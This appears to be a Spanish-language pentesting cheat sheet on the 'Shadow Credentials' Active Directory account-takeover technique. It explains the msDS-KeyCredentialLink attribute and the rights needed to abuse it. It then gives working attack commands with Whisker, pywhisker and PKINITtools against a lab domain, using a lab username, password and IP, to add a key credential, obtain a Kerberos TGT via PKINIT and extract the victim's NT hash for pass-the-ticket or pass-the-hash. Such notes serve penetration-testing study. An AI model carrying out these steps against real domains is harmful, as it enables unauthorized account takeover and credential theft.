# Info

- Tecnica de account takeover.
- Consiste en inyectar claves propias en el atributo msDS-KeyCredentialLink de un usuario/computadora
- Permite obtener un TGT mediante PKINIT.

### Requisitos

- DC > 2016
- Infraestructura PKI
- permisos de: GenericAll, GenericWrite o WriteProperty sobre msDS-KeyCredentialLink.

###### En bloodhound el permiso para escribir el msDS-KeyCredentialLink figura como "AddKeyCredentialLink"

### msDS-KeyCredentialLink

Este atributo contiene credenciales de clave, que son objetos serializados que incluyen información como la fecha de creación, el nombre completo del propietario, un GUID que representa el ID del dispositivo y, por supuesto, la clave pública. Dado que una cuenta puede tener varios dispositivos vinculados, msDS-KeyCredentialLinkes un atributo multivalor.


# Abuso

## Desde windows

### Wihisker

    .\\Whisker.exe add /target:<user>

Luego usamos el output de rubeus que nos da el script para obetener un ticket y hacer un ptt (lo más performante si hay kerberos) o el NTML hash para hacer PTH.



## Desde linux

### PyWhisker - PKinittools
#### Repos
    git clone -q https://github.com/ShutdownRepo/pywhisker


    git clone -q https://github.com/dirkjanm/PKINITtools
### Explotación

    python  pywhisker.py -d lab.local -u jeffry -p Music001 --target gabriel --action add --dc-ip 10.129.234.190

Esto nos creará un **.pfx** y una contraseña para que luego extraigamos el hash o el ticket con PKINITtools.


    python gettgtpkinit.py -cert-pfx ../pywhisker/pywhisker/EVptFwRk.pfx -pfx-pass Kv9rINEQDdmn32Nm8YkZ lab.local/gabriel gabriel.ccache -dc-ip 10.129.234.190

esto nos dara una key para usar con getnthash

    KRB5CCNAME=gabriel.ccache python3 getnthash.py -key 82294f48faa6dcc73a280af0f641db91adfd7e295bb4d77263201ccf550bac7e lab.local/gabriel -dc-ip 10.129.234.190




